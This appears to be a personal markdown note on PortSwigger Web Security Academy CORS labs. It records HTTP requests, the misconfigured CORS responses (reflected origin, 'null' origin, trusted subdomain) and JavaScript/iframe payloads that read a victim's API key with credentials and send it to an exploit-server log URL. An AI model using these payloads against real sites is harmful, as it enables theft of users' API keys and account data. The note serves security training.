
[...back](../note.md)

# 1 endpoint

while logged in as wiener:peter
```http
GET /accountDetails HTTP/2
Host: 0a7e00e50308fd3c821de8ff00c50071.web-security-academy.net
Cookie: session=EFKOdKx2d4P8aHkj9lagoZ2SIb8p2HnA
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="141", "Not?A_Brand";v="8"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a7e00e50308fd3c821de8ff00c50071.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

---

HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "LcGb6pATADzb5DBJb5zdTd2fEFTWnoqn",
  "sessions": [
    "EFKOdKx2d4P8aHkj9lagoZ2SIb8p2HnA"
  ]
}
```

---

# 2 weak cors

`Access-Control-Allow-Credentials: true` 
without
`Access-Control-Allow-Origin`

*test*
`GET /accountDetails HTTP/2`
add
`Origin: a.com` (any)
response
```http
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{json}
```

---

# 3 include accountDetails script

this exposed in html of `GET /my-account?id=wiener`
```js
<script>
	fetch('/accountDetails', {credentials:'include'})
		.then(r => r.json())
		.then(j => document.getElementById('apikey').innerText = j.apikey)
</script>
 
```

---

# 4 csrf payload

`Origin: something.com` <<< add this to header

body
> GET /accountDetails
> extract response
> parse it to exploit.server/log?key

```js
<script>
fetch('https://0a7e00e50308fd3c821de8ff00c50071.web-security-academy.net/accountDetails', {
    method: 'GET',
    credentials: 'include',
    headers: {
        'Origin': 'https://example.com'
    }
})
.then(response => response.text())
.then(data => {
    window.location = 'https://exploit-0ae700a003b6fd2482f0e716018500dd.exploit-server.net/log?key=' + encodeURIComponent(data);
})
</script>
```

---

# 5 lab2 Origin: null

continue from previous lab...
check `Origin: null` with `GET /accountDetails`
response >>> `Access-Control-Allow-Origin: null`

*payload* use `<iframe>` wrapping `js`
```js
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a6a00a403c7f027801b8503005000d7.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0aa000d003bef09e80588478012d0012.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
 
 (`<iframe>` is sent with `Origin: null` by default)
 
---

# 6 lab3 Origin: {http,https} sub.domain

check `Origin: https://sub.domain` or `http`
response >>> `Access-Control-Allow-Origin: ...`

```js
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a4b00de04ce5b098037446c001600f4.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.setRequestHeader('Origin', 'https://a.0a4b00de04ce5b098037446c001600f4.web-security-academy.net');
    req.send();
    function reqListener() {
        location='https://exploit-0a6a003904c05b4f809943bb01ba0094.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>
```

---

[...back](../note.md)
